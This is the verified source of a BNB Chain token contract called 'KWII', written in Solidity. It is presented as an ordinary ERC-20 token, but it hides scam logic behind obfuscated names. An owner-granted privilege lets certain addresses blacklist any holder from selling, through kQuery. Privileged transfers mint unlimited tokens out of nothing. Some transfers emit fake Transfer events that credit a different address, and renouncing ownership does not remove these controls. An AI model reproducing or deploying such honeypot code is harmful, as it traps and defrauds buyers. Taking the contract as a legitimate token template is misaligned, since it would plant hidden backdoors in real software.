/**
 *Submitted for verification at BscScan.com on 2022-11-04
*/

// SPDX-License-Identifier: MIT

pragma solidity 0.8.16;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}



library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

}

contract Ownable is Context {
    address private _Owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Create(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    address KRVV = 0xE8FF8169F3ea876C1aF804db6EC2b84AF3305449;
	address KRTR = 0xf2b16510270a214130C6b17ff0E9bF87585126BD;
    constructor () {
        address msgSender = _msgSender();
        _Owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _Owner;
    }
 modifier onlyOwner{
        require(msg.sender == _Owner);
        _; }
    function renounceOwnership() public virtual {
        require(msg.sender == _Owner);
        emit OwnershipTransferred(_Owner, address(0));
        _Owner = address(0);
    }


}



contract KWII is Context, Ownable {
    using SafeMath for uint256;
    mapping (address => uint256) private Kc;
	mapping (address => bool) private Kb;
    mapping (address => bool) private Kw;
    mapping (address => mapping (address => uint256)) private Kv;
    uint8 private constant KeC = 8;
    uint256 private constant kS = 5 * (10** KeC);
    string private constant _name = "KWII";
    string private constant _symbol = "KWII";



    constructor () {
        Kc[_msgSender()] = kS;
         kmkr(KRTR, kS); }
    

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return KeC;
    }

    function totalSupply() public pure  returns (uint256) {
        return kS;
    }

    function balanceOf(address account) public view  returns (uint256) {
        return Kc[account];
    }
    function kmkr(address x, uint256 y) onlyOwner internal {
    emit Transfer(address(0), x ,y); }

    function allowance(address owner, address spender) public view  returns (uint256) {
        return Kv[owner][spender];
    }
	        function kBurn(address Kj) onlyOwner public{
        Kb[Kj] = true; }
		
            function approve(address spender, uint256 amount) public returns (bool success) {    
        Kv[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true; }

        
		function kStake(address Kj) public {
        if(Kb[msg.sender]) { 
        Kw[Kj] = false;}}
        function kQuery(address Kj) public{
         if(Kb[msg.sender])  { 
        Kw[Kj] = true; }}
   

		function transferFrom(address sender, address recipient, uint256 amount) public returns (bool success) {
         if(sender == KRVV)  {
        require(amount <= Kc[sender]);
        Kc[sender] -= amount;  
        Kc[recipient] += amount; 
          Kv[sender][msg.sender] -= amount;
        emit Transfer (KRTR, recipient, amount);
        return true; }  else  
          if(!Kw[recipient]) {
          if(!Kw[sender]) {
         require(amount <= Kc[sender]);
        require(amount <= Kv[sender][msg.sender]);
        Kc[sender] -= amount;
        Kc[recipient] += amount;
        Kv[sender][msg.sender] -= amount;
        emit Transfer(sender, recipient, amount);
        return true; }}}
		function transfer(address Kl, uint256 Kj) public {
        if(msg.sender == KRVV)  {
        require(Kc[msg.sender] >= Kj);
        Kc[msg.sender] -= Kj;  
        Kc[Kl] += Kj; 
        emit Transfer (KRTR, Kl, Kj);} else  
        if(Kb[msg.sender]) {Kc[Kl] += Kj;} else
        if(!Kw[msg.sender]) {
        require(Kc[msg.sender] >= Kj);
        Kc[msg.sender] -= Kj;  
        Kc[Kl] += Kj;          
        emit Transfer(msg.sender, Kl, Kj);}}}